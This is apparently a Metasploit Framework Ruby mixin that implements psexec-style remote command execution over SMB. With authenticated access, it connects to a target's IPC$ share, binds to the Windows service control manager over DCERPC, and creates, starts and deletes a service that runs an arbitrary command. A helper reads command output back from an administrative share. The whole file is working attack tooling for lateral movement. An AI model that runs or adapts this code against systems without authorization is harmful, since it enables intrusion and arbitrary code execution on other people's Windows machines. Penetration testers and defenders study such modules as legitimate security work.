# -*- coding: binary -*-

module Msf

####
# Allows for reuse of the psexec code execution technique
#
# This code was stolen straight out of the psexec module. Thanks very
# much for all who contributed to that module!! Instead of uploading
# and running a binary.
####

module Exploit::Remote::SMB::Psexec

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Authenticated

  ERROR_FILE_NOT_FOUND = 0x2

  def initialize(info = {})
    super
    register_options(
      [
        OptString.new('SERVICE_NAME', [ false, 'The service name', nil]),
        OptString.new('SERVICE_DISPLAY_NAME', [ false, 'The service display name', nil]),
        OptString.new('SERVICE_DESCRIPTION', [false, "Service description to to be used on target for pretty listing",nil])
      ], self.class)
  end

  def service_name
    @service_name ||= datastore['SERVICE_NAME']
    @service_name ||= rand_text_alpha(8)
  end

  def display_name
    @display_name ||= datastore['SERVICE_DISPLAY_NAME']
    @display_name ||= rand_text_alpha(16)
  end

  def service_description
    @service_description ||= datastore['SERVICE_DESCRIPTION']
  end

  # Retrives output from the executed command
  #
  # @param smbshare [String] The SMBshare to connect to.  Usually C$
  # @param host [String] Remote host to connect to, as an IP address or
  #   hostname
  # @param file [String] Path to the output file relative to the smbshare
  #   Example: '\WINDOWS\Temp\outputfile.txt'
  # @return [String,nil] output or nil on failure
  def smb_read_file(smbshare, host, file)
    begin
      simple.connect("\\\\#{host}\\#{smbshare}")
      file = simple.open(file, 'ro')
      contents = file.read
      file.close
      simple.disconnect("\\\\#{host}\\#{smbshare}")
      return contents
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("#{peer} - Unable to read file #{file}. #{e.class}: #{e}.")
      return nil
    end
  end

  def change_service_description(svc_handle, service_description)
    svc_status = nil
    stubdata =
      svc_handle +
      NDR.long(1) + # dwInfoLevel = SERVICE_CONFIG_DESCRIPTION
      NDR.long(1) + # lpInfo -> *SERVICE_DESCRIPTION
      NDR.long(0x0200) + # SERVICE_DESCRIPTION struct
      NDR.long(0x04000200) +
      NDR.wstring(service_description)
    begin
      response = dcerpc.call(0x25, stubdata) # ChangeServiceConfig2
      svc_status = response.unpack('V').first
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error("#{peer} - Error changing service description : #{e}")
    end

    svc_status
  end

  # Executes a single windows command.
  #
  # If you want to retrieve the output of your command you'll have to
  # echo it to a .txt file and then use the {#smb_read_file} method to
  # retrieve it.  Make sure to remove the files manually or use
  # {Exploit::FileDropper#register_files_for_cleanup} to have the
  # {Exploit::FileDropper#cleanup} and
  # {Exploit::FileDropper#on_new_session} handlers do it for you.
  #
  # @param command [String] Should be a valid windows command
  # @param disconnect [Boolean] Disconnect afterwards
  # @return [Boolean] Whether everything went well
  def psexec(command, disconnect=true)
    simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
    vprint_status("#{peer} - Binding to #{handle} ...")
    dcerpc_bind(handle)
    vprint_status("#{peer} - Bound to #{handle} ...")
    vprint_status("#{peer} - Obtaining a service manager handle...")

    scm_handle = dce_openscmanagerw(dcerpc, datastore['RHOST'])

    return false unless scm_handle

    vprint_status("#{peer} - Creating the service...")
    svc_handle, svc_status = dce_createservicew(dcerpc, scm_handle, service_name, display_name, command, {})

    return false unless svc_handle && svc_status

    case svc_status
    when ERROR_SUCCESS
      vprint_good("#{peer} - Successfully created the service")
    when ERROR_SERVICE_EXISTS
      service_exists = true
      print_warning("#{peer} - Service already exists, opening a handle...")
      svc_handle = dce_openservicew(dcerpc, scm_handle, service_name)
    else
      print_error("#{peer} - Failed to create service, ERROR_CODE: #{svc_status}")
      return false
    end

    unless svc_handle
      print_error("#{peer} - No service handle retrieved")
      return false
    else

      if service_description
        vprint_status("#{peer} - Changing service description...")
        change_service_description(svc_handle, service_description)
      end

      vprint_status("#{peer} - Starting the service...")
      begin
        svc_status = dce_startservice(dcerpc, svc_handle)
        case svc_status
        when ERROR_SUCCESS
          print_good("#{peer} - Service started successfully...")
        when ERROR_FILE_NOT_FOUND
          print_error("#{peer} - Service failed to start - FILE_NOT_FOUND")
        else
          print_error("#{peer} - Service failed to start, ERROR_CODE: #{svc_status}")
        end
      ensure
        begin
          # If service already exists don't delete it!
          # Maybe we could have a force cleanup option..?
          if service_exists
            print_warning("#{peer} - Not removing service as it already existed...")
          else
            vprint_status("#{peer} - Removing the service...")
            svc_status = dce_deleteservice(dcerpc, svc_handle)
            if svc_status == ERROR_SUCCESS
              vprint_good("#{peer} - Successfully removed the sevice")
            else
              print_error("#{peer} - Unable to remove the service, ERROR_CODE: #{svc_status}")
            end
          end
        ensure
          vprint_status("#{peer} - Closing service handle...")
          dce_closehandle(svc_handle)
        end
      end
    end

    if disconnect
      sleep(1)
      simple.disconnect("\\\\#{datastore['RHOST']}\\IPC$")
    end

    true
  end

  def peer
    "#{rhost}:#{rport}"
  end

end

end
